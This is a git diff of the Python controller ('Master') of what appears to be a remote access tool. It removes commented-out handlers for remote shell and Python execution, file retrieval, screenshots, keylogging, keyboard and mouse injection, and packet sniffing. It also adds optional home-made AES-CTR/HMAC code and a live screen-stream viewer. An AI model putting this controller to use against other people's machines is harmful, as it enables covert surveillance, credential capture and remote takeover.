@@ -18,54 +18,7 @@ from encryption.aes.aes_types import CTR
 from Crypto.Cipher import AES
 from Crypto.Util import Counter
 Commend = Callable[[],bytes]
-# # unneeded
-# RETURN = False
-# # unneeded
-# def cmd() -> bytes:
-#     global RETURN
-#     commend = input("enter your wanted commend or enter \"return\" to return to menu: ")
-#     check_return(commend)
-#     if RETURN:
-#         return b""
-#     return b"cmd:"+commend.encode()
-# # unneeded
-# def powershell()->bytes:
-#     global RETURN
-#     commend = input("enter your wanted commend or enter \"return\" to return to menu: ")
-#     check_return(commend)
-#     if RETURN:
-#         return b""
-#     return b"powershell:"+commend.encode()
-# # unneeded
-# def python()->bytes:
-#     global RETURN
-#     print("enter your python code (end with an empty line) or enter \"return\" to return to menu: ")
-#     code = ""
-#     while True:
-#         line = sys.stdin.readline().strip()
-#         if not line:
-#             break
-#         check_return(line)
-#         if RETURN:
-#             return b""
-#         code += line + "\n"
-#     return b"python:"+code.encode()
-# # unneeded
-# def check_return(text:str):
-#     global RETURN
-#     if text == "return":
-#         RETURN = True
-#
-# # unneeded
-# def receive_file() ->bytes:
-#     global RETURN
-#     file_path = input("enter the path of the file you want in the worker side or enter \"return\" to return to menu: ")
-#     check_return(file_path)
-#     if RETURN:
-#         return b""
-#     return b"receive_file:"+file_path.encode()
-#
-#
+
 def send_file(file_path:str,name:bytes) ->bytes:
     try:
         with open(file_path, "rb") as file:
@@ -80,86 +33,6 @@ def send_file(file_path:str,name:bytes) ->bytes:
     except Exception as e:
         return f"error: {e}".encode()
 
-# # unneeded
-# def screen_shot() ->bytes:
-#     return b"screen_shot"
-# # unneeded
-# def exit_endless_print():
-#     msg = input("enter \"return\" to return to menu")
-#     check_return(msg)
-# # unneeded
-# def listen_to_keys()->bytes:
-#     return b"listen_to_keys"
-#
-#
-# #unneeded
-# def live_stream() -> bytes:
-#     return b"live_stream"
-# # unneeded
-# def press_key_in_worker() -> bytes:
-#     global RETURN
-#     print("every key you press will be pressed in worker, enter ctrl+q to quit to menu")
-#     while True:
-#
-#         event = keyboard.read_event()
-#         if event.event_type == "down":
-#             if keyboard.is_pressed("ctrl") and keyboard.is_pressed("q"):
-#                 RETURN = True
-#                 return b""
-#             else:
-#                 return b"press_key_in_worker:" + event.name.encode()
-# # unneeded
-# def control_mouse() -> bytes:
-#     global RETURN
-#     print("enter mouse parameters(you can enter \"return\" at any time to return to menu):")
-#     x = input("horizontal coordinate: ")
-#     check_return(x)
-#     if RETURN:
-#         return b""
-#     while not x.isdigit():
-#         x = input("please enter a number ")
-#     y = input("vertical coordinate: ")
-#     check_return(y)
-#     if RETURN:
-#         return b""
-#     while not y.isdigit():
-#         y = input("please enter a number ")
-#     button = input("which button do you want to press: ")
-#     check_return(button)
-#     if RETURN:
-#         return b""
-#     while button != "left" and button!="right":
-#         button = input("please enter left or right ")
-#     return b"control_mouse:"+x.encode()+b":"+y.encode()+b":"+button.encode()
-#
-# # unneeded
-# def sniff_from_worker() ->bytes:
-#     print("please enter parameters(you can enter \"return\" at any time to return to menu):")
-#     scapy_filter = input("enter your filter for the sniffing: ")
-#     check_return(scapy_filter)
-#     if RETURN:
-#         return  b""
-#     scapy_time = input("enter how much you want the sniffing to continue:")
-#     check_return(scapy_time)
-#     if RETURN:
-#         return  b""
-#     while not scapy_time.isdigit():
-#         scapy_time = input("please enter a valid time  in numbers")
-#     scapy_amount = input("enter how much packets you want to sniff: ")
-#     check_return(scapy_amount)
-#     if RETURN:
-#         return  b""
-#     while not scapy_amount.isdigit():
-#         scapy_amount = input("please enter a valid time  in numbers")
-#     return b"sniff_from_worker:" + scapy_filter.encode() + b":" + scapy_time.encode() + b":" + scapy_amount.encode()
-#
-# # unneeded
-# def save_file(received:bytes):
-#     file_name = input("how do you want to save your file?")
-#     while file_name == "" or "." not in file_name:
-#         file_name = input("please enter a valid name")
-#     with open(file_name,"wb") as file:
-#         file.write(received)
 
 class Client:
     def __init__(self,command_sock:socket.socket,stream_sock:socket.socket,peer_master_key:bytes, master_key:bytes):
@@ -200,6 +73,7 @@ class Master:
         self.control_key = False
         self.control_mouse = False
         self.update_clients = None
+        self.listen = False
         self.clients:dict[(str,int),Client] = {}
         private_key, public_key = rsa.rsa_keys(rsa.distant_random_primes(1024))
         self.rsa = rsa.RSA(my_public_key=public_key,my_private_key=private_key)
@@ -213,7 +87,7 @@ class Master:
         with self._sock_lock:
             self.sender(self.rsa.dump_my_public_key(),seal=False, sock=client)
             client_aes_key_en =self.receiver(open_seal=False, sock=client)
-        master_key = b"123456789101112!"
+        master_key = os.urandom(16).hex().encode()
         self.sender(self.rsa.send(master_key, hashlib.sha256(master_key).digest()), seal=False, sock=client)
         stream_client = self.stream_server.accept()[0]
         self.clients[address[0]] = Client(client,stream_client,self.rsa.receive(client_aes_key_en).encode(),master_key)
@@ -229,7 +103,7 @@ class Master:
         return data
 
 
-    def receiver(self, stream: bool = False, open_seal: bool = True, sock:socket.socket = None) -> bytes:
+    def receiver(self, stream: bool = False, open_seal: bool = True, sock:socket.socket = None, my_enc:bool = False) -> bytes:
         if sock:
             cur_sock = sock
             cur_client = None
@@ -255,17 +129,23 @@ class Master:
             c = blob[12:-32]
             header = aad + nonce
             to_mac =header + c
-            calc = hmac.new(mac_key, to_mac, hashlib.sha256).digest()
+            if not my_enc:
+                calc = hmac.new(mac_key, to_mac, hashlib.sha256).digest()
+            else:
+                calc = HMAC("sha256",to_mac,mac_key,32)
             if not hmac.compare_digest(calc, tag):
                 return b"error: Authentication failed"
-
-            ctr = Counter.new(128, initial_value=int.from_bytes(nonce))
-            return AES.new(aes_key, AES.MODE_CTR,counter=ctr).decrypt(c)
+            if not my_enc:
+                ctr = Counter.new(128, initial_value=int.from_bytes(nonce))
+                return AES.new(aes_key, AES.MODE_CTR,counter=ctr).decrypt(c)
+            else:
+                ctr = CTR(aes_key,nonce)
+                return ctr.decrypt(c)
         else:
             return blob
 
 
-    def sender(self, message: bytes, stream: bool = False, seal: bool = True, sock: socket.socket = None):
+    def sender(self, message: bytes, stream: bool = False, seal: bool = True, sock: socket.socket = None, my_enc:bool = False):
         if sock:
             client_sock = sock
             cur_client = None
@@ -278,11 +158,18 @@ class Master:
         if seal:
             aes_key, mac_key = cur_client.derive_own_keys()
             nonce = os.urandom(8)
-            ctr = Counter.new(128,initial_value=int.from_bytes(nonce))
-            c = AES.new(aes_key, AES.MODE_CTR,counter=ctr).encrypt(message)
-            header = struct.pack("I",len(message)) + nonce
-            to_mac = header + c
-            tag = hmac.new(mac_key, to_mac, hashlib.sha256).digest()
+            if not my_enc:
+                ctr = Counter.new(128,initial_value=int.from_bytes(nonce))
+                c = AES.new(aes_key, AES.MODE_CTR,counter=ctr).encrypt(message)
+                header = struct.pack("I",len(message)) + nonce
+                to_mac = header + c
+                tag = hmac.new(mac_key, to_mac, hashlib.sha256).digest()
+            else:
+                ctr = CTR(aes_key,nonce)
+                c = ctr.encrypt(message)
+                header = struct.pack("I", len(message)) + nonce
+                to_mac = header + c
+                tag = HMAC("sha256",to_mac,mac_key,32)
             data = struct.pack("I", len(header + c + tag)) + header + c + tag
         else:
             data = struct.pack("I", len(message)) + message
@@ -326,6 +213,9 @@ class Master:
             else:
                 time.sleep(0.1)
 
+
+
+
     def show_stream(self):
         root = tkinter.Tk()
         screen_width = root.winfo_screenwidth()
@@ -333,18 +223,14 @@ class Master:
         root.destroy()
         while True:
             if self.streaming:
-
                 self.sender(b"live_stream")
-                frame_data = self.receiver(stream=True,open_seal=False)
-
+                frame_data = self.receiver(stream=True)
                 if not frame_data:
                     time.sleep(0.05)
                     continue
-
                 frame = cv2.imdecode(np.frombuffer(frame_data, dtype=np.uint8), cv2.IMREAD_COLOR)
                 if frame is None:
                     time.sleep(0.005)
-
                     continue
 
                 h, w, _ = frame.shape
@@ -379,23 +265,11 @@ class Master:
                 try:
                     cv2.destroyWindow("Live Stream")
                 except cv2.error:
-                    # window didn't exist → safe to ignore
                     pass
                 time.sleep(0.1)
 
 
 
-    # def menu(self) ->str:
-    #     print("which action do you want to do? ")
-    #     i = 1
-    #     for key in self.functions.keys():
-    #         print(f"{i}: {key}")
-    #         i+=1
-    #     print(f"{len(self.functions.keys())+1}: quit")
-    #     action = input("enter action name: ").replace(" ","_")
-    #     while action not in self.functions.keys() and action != "quit":
-    #         action = input("enter a valid name: ").replace(" ","_")
-    #     return action
 
 
     def run2(self,function:str, message:bytes) -> bytes:
@@ -416,56 +290,3 @@ class Master:
             received = self.receiver()
         return received
 
-    # def run1(self):
-    #     global RETURN
-    #     self.connect()
-    #     function = self.menu()
-    #     while function !="quit":
-    #         message = self.functions[function]()
-    #         if function == "listen_to_keys":
-    #             t = threading.Thread(target=exit_endless_print, daemon=True)
-    #             t.start()
-    #             while not RETURN:
-    #                 self.sender(self.client,message)
-    #                 received = self.receiver(self.client).decode()
-    #                 if received:
-    #                     print(received)
-    #         if RETURN:
-    #             RETURN = False
-    #             function = self.menu()
-    #             continue
-    #         self.sender(self.client,message)
-    #         if function == "live_stream":
-    #             self.show_stream()
-    #             continue
-    #
-    #         received = self.receiver(self.client)
-    #         if b"error" == received[:5]:
-    #             print(received.decode())
-    #         elif function in ["receive_file","screen_shot"]:
-    #             save_file(received)
-    #             if function == "screen_shot":
-    #                 function = self.menu()
-    #                 continue
-    #         elif function == "sniff_from_worker":
-    #             name = input("enter input for file name(without extension)")
-    #             while "." in name:
-    #                 name = input("I said without extension")
-    #             with open(name+".pcap","wb") as file:
-    #                 file.write(received)
-    #                 print("saved packets successfully")
-    #         else:
-    #             print(received.decode())
-    #     self.sender(self.client,"quit".encode())
-    #     self.server.close()
-    #     self.client.close()
-
-
-
-# def main():
-#     functions: dict[str,Commend] = {"cmd": cmd, "powershell": powershell, "python":python, "send_file":send_file, "receive_file":receive_file, "screen_shot": screen_shot,"listen_to_keys":listen_to_keys, "press_key_in_worker":press_key_in_worker, "control_mouse":control_mouse, "sniff_from_worker":sniff_from_worker, "live_stream":live_stream}
-#     master = Master("10.0.0.12",5555)
-#     master.run1()
-#
-# if __name__ == '__main__':
-#     main()
